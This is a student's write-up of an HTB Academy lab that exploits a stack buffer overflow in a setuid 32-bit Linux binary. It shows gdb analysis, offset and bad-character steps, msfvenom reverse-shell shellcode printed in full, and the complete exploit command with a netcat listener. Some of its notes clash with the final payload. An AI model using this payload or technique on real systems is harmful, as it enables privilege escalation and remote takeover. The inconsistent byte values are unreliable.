# Skill Asessment
### Examination of the binary
First we can examine the code. 

```nasm
(gdb) disass main
Dump of assembler code for function main:
   0x0000073b <+0>:     lea    ecx,[esp+0x4]
   0x0000073f <+4>:     and    esp,0xfffffff0
   0x00000742 <+7>:     push   DWORD PTR [ecx-0x4]
   0x00000745 <+10>:    push   ebp
   0x00000746 <+11>:    mov    ebp,esp
   0x00000748 <+13>:    push   esi
   0x00000749 <+14>:    push   ebx
   0x0000074a <+15>:    push   ecx
   0x0000074b <+16>:    sub    esp,0xc
   0x0000074e <+19>:    call   0x590 <__x86.get_pc_thunk.bx>
   0x00000753 <+24>:    add    ebx,0x1869
   0x00000759 <+30>:    mov    esi,ecx
   0x0000075b <+32>:    sub    esp,0x4
   0x0000075e <+35>:    push   0x0
   0x00000760 <+37>:    push   0x0
   0x00000762 <+39>:    push   0x0
   0x00000764 <+41>:    call   0x4b0 <setresuid@plt>
   0x00000769 <+46>:    add    esp,0x10
   0x0000076c <+49>:    mov    eax,DWORD PTR [esi+0x4]
   0x0000076f <+52>:    add    eax,0x4
   0x00000772 <+55>:    mov    eax,DWORD PTR [eax]
   0x00000774 <+57>:    sub    esp,0xc
   0x00000777 <+60>:    push   eax
   0x00000778 <+61>:    call   0x68d <leavemsg>
   0x0000077d <+66>:    add    esp,0x10
   0x00000780 <+69>:    sub    esp,0xc
   0x00000783 <+72>:    lea    eax,[ebx-0x175c]
   0x00000789 <+78>:    push   eax
   0x0000078a <+79>:    call   0x4f0 <puts@plt>
   0x0000078f <+84>:    add    esp,0x10
   0x00000792 <+87>:    mov    eax,0x0
   0x00000797 <+92>:    lea    esp,[ebp-0xc]
   0x0000079a <+95>:    pop    ecx
   0x0000079b <+96>:    pop    ebx
   0x0000079c <+97>:    pop    esi
   0x0000079d <+98>:    pop    ebp
   0x0000079e <+99>:    lea    esp,[ecx-0x4]
   0x000007a1 <+102>:   ret
End of assembler dump.
``` 

We can see a leavemsg function so let's disassemble it.

```nasm
 disass leavemsg
Dump of assembler code for function leavemsg:
   0x0000068d <+0>:     push   ebp
   0x0000068e <+1>:     mov    ebp,esp
   0x00000690 <+3>:     push   ebx
   0x00000691 <+4>:     sub    esp,0x804
   0x00000697 <+10>:    call   0x590 <__x86.get_pc_thunk.bx>
   0x0000069c <+15>:    add    ebx,0x1920
   0x000006a2 <+21>:    sub    esp,0x8
   0x000006a5 <+24>:    lea    eax,[ebx-0x178c]
   0x000006ab <+30>:    push   eax
   0x000006ac <+31>:    lea    eax,[ebx-0x178a]
   0x000006b2 <+37>:    push   eax
   0x000006b3 <+38>:    call   0x520 <fopen@plt>
   0x000006b8 <+43>:    add    esp,0x10
   0x000006bb <+46>:    mov    edx,eax
   0x000006bd <+48>:    lea    eax,[ebx+0x50]
   0x000006c3 <+54>:    mov    DWORD PTR [eax],edx
   0x000006c5 <+56>:    lea    eax,[ebx+0x50]
   0x000006cb <+62>:    mov    eax,DWORD PTR [eax]
   0x000006cd <+64>:    test   eax,eax
   0x000006cf <+66>:    jne    0x6ed <leavemsg+96>
   0x000006d1 <+68>:    sub    esp,0xc
   0x000006d4 <+71>:    lea    eax,[ebx-0x1770]
   0x000006da <+77>:    push   eax
   0x000006db <+78>:    call   0x4c0 <printf@plt>
   0x000006e0 <+83>:    add    esp,0x10
   0x000006e3 <+86>:    sub    esp,0xc
   0x000006e6 <+89>:    push   0x1
   0x000006e8 <+91>:    call   0x500 <exit@plt>
   0x000006ed <+96>:    sub    esp,0x8
   0x000006f0 <+99>:    push   DWORD PTR [ebp+0x8]
   0x000006f3 <+102>:   lea    eax,[ebp-0x808]
   0x000006f9 <+108>:   push   eax
   0x000006fa <+109>:   call   0x4e0 <strcpy@plt>
   0x000006ff <+114>:   add    esp,0x10
   0x00000702 <+117>:   lea    eax,[ebx+0x50]
   0x00000708 <+123>:   mov    eax,DWORD PTR [eax]
   0x0000070a <+125>:   sub    esp,0x8
   0x0000070d <+128>:   push   eax
   0x0000070e <+129>:   lea    eax,[ebp-0x808]
   0x00000714 <+135>:   push   eax
   0x00000715 <+136>:   call   0x530 <fputs@plt>
   0x0000071a <+141>:   add    esp,0x10
   0x0000071d <+144>:   lea    eax,[ebx+0x50]
   0x00000723 <+150>:   mov    eax,DWORD PTR [eax]
   0x00000725 <+152>:   sub    esp,0xc
   0x00000728 <+155>:   push   eax
   0x00000729 <+156>:   call   0x4d0 <fclose@plt>
   0x0000072e <+161>:   add    esp,0x10
   0x00000731 <+164>:   mov    eax,0x0
   0x00000736 <+169>:   mov    ebx,DWORD PTR [ebp-0x4]
```

There is the strcpy function which is a vulnerable function.
```nasm
   0x000006fa <+109>:   call   0x4e0 <strcpy@plt>
``` 

### Question 1
![Pasted image 20211212191330](https://user-images.githubusercontent.com/87600765/146047922-233da7e5-d7e7-424e-ad2b-ac9e3717e8c1.png)
The file command is a standard program of Unix and Unix-like operating systems for recognizing the type of data contained in a computer file.
```nasm
htb-student@nixbof32skills:~$ file leave_msg
leave_msg: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8694607c1cba3fb3814a144fb014da53d3f3e49e, not stripped
``` 
As we see, the leave_msg file isn  an ELF 32-bit file.
![Pasted image 20211212191510](https://user-images.githubusercontent.com/87600765/146048310-6b9a95cd-85fb-4ab9-a851-1228b4998cf4.png)

### Question 2 
![Pasted image 20211212192100](https://user-images.githubusercontent.com/87600765/146049008-51469577-27e6-49f6-95d6-dc6e5980b3c1.png)
Let's try to dump the cores.
```nasm
(gdb) run $(python -c "print '\x55' * 2500")
Starting program: /home/htb-student/leave_msg $(python -c "print '\x55' * 2500")

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
(gdb) i r
eax            0x0      0
ecx            0x15     21
edx            0x56558158       1448444248
ebx            0x55555555       1431655765
esp            0xffffcbc0       0xffffcbc0
ebp            0x55555555       0x55555555
esi            0xffffcc00       -13312
edi            0x0      0
eip            0x55555555       0x55555555
eflags         0x10282  [ SF IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
(gdb)
``` 
Now we can see that there is a segmentation fault. Then we have to determine the offset. We can use the tool "pattern-create".
```nasm
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500 > pattern.txt
``` 
Then we print the pattern instead of `\x55`.
```nasm
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3A...<SNIP>...9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D'")
``` 
The memory adress in eip is: 
```nasm
(gdb) i r eip
eip            0x37714336       0x37714336
``` 
Finally we can determine the offset thanks to the tool "pattern_offset".
```nasm
└─# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37714336                   130 ⨯
[*] Exact match at offset 2060
```
###### Buffer
![Pasted image 20211212200540](https://user-images.githubusercontent.com/87600765/146049130-329ef7cf-47b0-4f1a-8ebc-cdcef9005d36.png)
![Pasted image 20211212200620](https://user-images.githubusercontent.com/87600765/146049177-93a85c32-c3b2-4f15-a3e4-49f1e5d796c4.png)

### Question 3
![Pasted image 20211212202828](https://user-images.githubusercontent.com/87600765/146049258-d933e449-be47-4806-84f6-3d41f1393584.png)
For overwriting eip we have to send 2064 bytes.
```nasm
2060 + 4 bytes
``` 
```nasm
(gdb) nasm
Breakpoint 1 at 0x74b
(gdb) run $(python -c 'print "\x55" * 2060 + "\x66" * 4')\
``` 
We set a breakpoint at the corresponding function so that the execution stops at this point, and we can analyze the memory's content.
```nasm
(gdb) info proc all
process 2405
warning: target file /proc/2405/cmdline contained unexpected null characters
cmdline = '/home/htb-student/leave_msg'
cwd = '/home/htb-student'
exe = '/home/htb-student/leave_msg'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
        0x56555000 0x56556000     0x1000        0x0 /home/htb-student/leave_msg
        0x56556000 0x56557000     0x1000        0x0 /home/htb-student/leave_msg
        0x56557000 0x56558000     0x1000     0x1000 /home/htb-student/leave_msg
        0xf7ded000 0xf7fbf000   0x1d2000        0x0 /lib32/libc-2.27.so
        0xf7fbf000 0xf7fc0000     0x1000   0x1d2000 /lib32/libc-2.27.so
        0xf7fc0000 0xf7fc2000     0x2000   0x1d2000 /lib32/libc-2.27.so
        0xf7fc2000 0xf7fc3000     0x1000   0x1d4000 /lib32/libc-2.27.so
        0xf7fc3000 0xf7fc6000     0x3000        0x0
        0xf7fcf000 0xf7fd1000     0x2000        0x0
        0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
        0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
        0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
        0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
        0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
        0xfffdc000 0xffffe000    0x22000        0x0 [stack]
``` 
the size of the stack space:
```nasm
0xfffdc000 0xffffe000    0x22000        0x0 [stack]
```
![Pasted image 20211212204838](https://user-images.githubusercontent.com/87600765/146049621-61f4b73b-8559-4484-9fd5-092ddd574022.png)

### Question 4
![Pasted image 20211212210026](https://user-images.githubusercontent.com/87600765/146049737-b5ea9e01-861b-4225-8629-3fd204a3f708.png)

#### Shellcode lenght
Now we have to determine the lenght of our shellcode.
```nasm
└─# msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=4444 --platform linux --arch x86 --format c
No encoder specified, outputting raw payload
Payload size: 68 bytes
...<SNIP>...
``` 
We now know that our payload will be about 68 bytes. As a precaution, we should try to take a larger range if the shellcode increases due to later specifications.
Often it can be useful to insert some `no operation instruction` (`NOPS`) before our shellcode begins so that it can be executed cleanly. Let us briefly summarize what we need for this:
1. We need a total of 2064 bytes to get to the eip
2. Here, we can use an additional 100 bytes of NOPS
3. 150 bytes for our shellcode.
```md
   Buffer = "\x55" * (2064 - 100 - 150 - 4) = 1810
   NOPS = "\x90" * 100
   Shellcode = "\x44" * 150
   EIP = "\x66" * 4
```
##### Buffer
![Pasted image 20211212212346](https://user-images.githubusercontent.com/87600765/146050433-7d1247eb-1109-4105-b52e-75c5c134bb2f.png)
#### Identification of bad characters
Now we have to identify bad characters for running the program correctly.
These reserved characters, also known as `bad characters` can vary, but often we will see characters like this:
-   `\x00` - Null Byte (**always a bad character**)
-   `\x0A` - Line Feed
-   `\x0D` - Carriage Return
-   `\xFF` - Form Feed
this is our character list
```md
CHARS="\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
The char size is 256 bytes.
```md
Buffer = "\x55" * (2064 - 255 - 4) = 1805
 CHARS = "\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```
We will set a breakpoint at the corresponding function so that the execution stops at this point, and we can analyze the memory's content.
##### Break point
```nasm
(gdb) break leavemsg
Breakpoint 1 at 0x691
(gdb)
``` 
##### Send chars
```nasm
(gdb) run $(python -c "print '\x55' * 1805 + '\x01\x02\x03\x04...<SNIP>...\xfd\xfe\xff' + '\x66' * 4")
Starting program: /home/htb-student/leave_msg $(python -c "print '\x55' * 1805 + '\x01\x02\x03\x04...<SNIP>...\xfd\xfe\xff' + '\x66' * 4")

Breakpoint 1, 0x56555691 in leavemsg ()
```
Now we can examine the stack and identify the bad charcaters.
```nasm
...<SNIP>...
0xffffd688:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd690:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd698:     0x55    0x55    0x55    0x55    0x55    0x01    0x02    0x03
													  # | ---> chars begin	
0xffffd6a0:     0x04    0x05    0x06    0x07    0x08    0x00    0x0b    0x0c
0xffffd6a8:     0x0d    0x0e    0x0f    0x10    0x11    0x12    0x13    0x14
0xffffd6b0:     0x15    0x16    0x17    0x18    0x19    0x1a    0x1b    0x1c
0xffffd6b8:     0x1d    0x1e    0x1f    0x00    0x21    0x22    0x23    0x24
0xffffd6c0:     0x25    0x26    0x27    0x28    0x29    0x2a    0x2b    0x2c
0xffffd6c8:     0x2d    0x2e    0x2f    0x30    0x31    0x32    0x33    0x34
...<SNIP>...
```
We can see that after the "`\x08`", we encounter the `\x00` instead of the "`\x09`" as expected. We can remove `\x09`
```nasm
# Substract the number of removed characters
Buffer = "\x55" * (2064 - 254 - 4) = 1806

# "\x00" & "\x09" removed: 256 - 2 = 254 bytes
 CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfd\xfe\xff" 
 
   EIP = "\x66" * 4
```
##### 	Send CHARS- Without `\x09` 
```nasm
(gdb)run $(python -c "print '\x55' * 1806 + '\x01\x02\x03\x04\x05\x06\x07\x08\x0a\...<SNIP>...\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' + '\x66' * 4")
``` 
Then we examine the stack
```nasm
(gdb)x/3000xb $esp
...<SNIP>...
0xffffd698:     0x55    0x55    0x55    0x55    0x55    0x01    0x02    0x03
0xffffd6a0:     0x04    0x05    0x06    0x07    0x08    0x00    0x0b    0x0c
...<SNIP...
```
We recognize that after the "`\x08`", we encounter the `\x00` instead of the "`\x0a`" as expected. We can remove `\x0a`

##### Note
```md
# Substract the number of removed characters
Buffer = "\x55" * (2064 - 253 - 4) = 1807	

# "\x00" & "\x09" & "\x0a" removed: 256 - 3 = 253 bytes
 CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0b...<SNIP>...\xfd\xfe\xff" 
 
   EIP = "\x66" * 4
```
##### Senc CHARS-Without `\x09`  &  `\x0a`
```nasm
(gdb)run $(python -c "print '\x55' * 1807 + '\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c...<SNIP>...\xfc\xfd\xfe\xff' + '\x66' * 4")
(gdb)x/3000xb $esp
...<SNIP>...
0xffffd6ac:     0x11    0x12    0x13    0x14    0x15    0x16    0x17    0x18
0xffffd6b4:     0x19    0x1a    0x1b    0x1c    0x1d    0x1e    0x1f    0x00
0xffffd6bc:     0x21    0x22    0x23    0x24    0x25    0x26    0x27    0x28
...<SNIP>...
```
After `\x1f`, we encounter `\x00` instead of `\x20`. We can now remove it. 
##### Note
```md
# Substract the number of removed characters
Buffer = "\x55" * (2064 - 252 - 4) = 1808	

# "\x00" & "\x09" & "\x0a" & "\x20" removed: 256 - 4 = 252 bytes
 CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0b...<SNIP>...\xfd\xfe\xff" 
 
   EIP = "\x66" * 4
   ```
If we sent char without `\x09` & `\x0a` & `\x20` and then examine the stack, we don't encounter bad charcater anymore
Finally the bad characters are `\x00` (which is always a bad character) & `x09`  & `x0a` & `\x20`

#### Generating our shellcode
Now that we have idenfify the bad characters we can generate our shellcode.
```nasm
└─# msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=4444 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
Saved as: shellcode
``` 
##### shellcode
```md
unsigned char buf[] =
"\xda\xc3\xb8\x7d\x24\xf0\x6e\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x12\x83\xea\xfc\x31\x42\x13\x03\x3f\x37\x12\x9b\x8e\xec\x25"
"\x87\xa3\x51\x99\x22\x41\xdf\xfc\x03\x23\x12\x7e\xf0\xf2\x1c"
"\x40\x3a\x84\x14\xc6\x3d\xec\xd9\x38\xbe\xed\x4d\x3b\xbe\xfc"
"\xd1\xb2\x5f\x4e\x8f\x94\xce\xfd\xe3\x16\x78\xe0\xc9\x99\x28"
"\x8a\xbf\xb6\xbf\x22\x28\xe6\x10\xd0\xc1\x71\x8d\x46\x41\x0b"
"\xb3\xd6\x6e\xc6\xb4";
```
Now that we have our shellcode, we adjust it to have only one string, and then we can adapt and submit our simple exploit again.
```md
   Buffer = "\x55" * (2064 - 124 - 95 - 4) = 1841
     NOPs = "\x90" * 124
Shellcode = "\xda\xc3\xb8\x7d...<SNIP>...\x71\x8d\x46\x41\x0b\xb3\xd6\x6e\xc6\xb4"
      EIP = "\x66" * 4'
```

#### Identification of the Return Address
we now have to choose an address to which we refer the `EIP` and which reads and executes one byte after the other starting at this address.
```nasm
(gdb)x/3000xb $esp
...<SNIP>...
0xffffd724:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd72c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd734:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd73c:     0xda    0xc3    0xb8    0x7d    0x24    0xf0    0x6e    0xd9
0xffffd744:     0x74    0x24    0xf4    0x5a    0x29    0xc9    0xb1    0x12
...<SNIP>...
```
In this case I want to choose the adress `0xffffd72c`.
##### Buffer
![image](https://user-images.githubusercontent.com/87600765/146051050-6f7fcc14-30d4-4774-8b8f-adce6628b7f6.png)
So now we just have to replace `'\x64' * 4*`  to `0xffffd72c` but in little endian which is `0x2cd7ffff` which is `\x2c\xd7\xff\xff`.
##### Notes
```md
   Buffer = "\x55" * (2064 - 124 - 95 - 4) = 1841
     NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11\xd4...<SNIP>...\x5a\x22\xa2"
      EIP = "\xc2\x7d\xff\xff"
```

##### Netcat
Now let set up our listener
```nasm
htb-student@nixbof32skills:~$ nc -lnvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
```

Now let execute our code **outside** gdb. 
```nasm
htb-student@nixbof32skills:~$ ./leave_msg $(python -c "print '\x55' * 1841 + '\x90' * 124 + '\xda\xc3\xb8\x7d\x24\xf0\x6e\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x12\x83\xea\xfc\x31\x42\x13\x03\x3f\x37\x12\x9b\x8e\xec\x25\x87\xa3\x51\x99\x22\x41\xdf\xfc\x03\x23\x12\x7e\xf0\xf2\x1c\x40\x3a\x84\x14\xc6\x3d\xec\xd9\x38\xbe\xed\x4d\x3b\xbe\xfc\xd1\xb2\x5f\x4e\x8f\x94\xce\xfd\xe3\x16\x78\xe0\xc9\x99\x28\x8a\xbf\xb6\xbf\x22\x28\xe6\x10\xd0\xc1\x71\x8d\x46\x41\x0b\xb3\xd6\x6e\xc6\xb4' + '\x2c\xd7\xff\xff'")
```
![Pasted image 20211213202658](https://user-images.githubusercontent.com/87600765/146051300-1469520b-ed6c-4dd1-892a-c0fc7e1c2f0d.png)
![Pasted image 20211213202831](https://user-images.githubusercontent.com/87600765/146051365-000e87e4-4e31-42b3-bb20-d24bb5313e22.png)

All the images that you see is providing from the HTB Academy website and the buffer images were modified by me for illustrate what I were doing.

*Academy, H. T. B. (n.d.). HTB Academy : Cyber security training. Cyber Security Training : HTB Academy. Retrieved December 14, 2021, from https://academy.hackthebox.com/module/details/318*
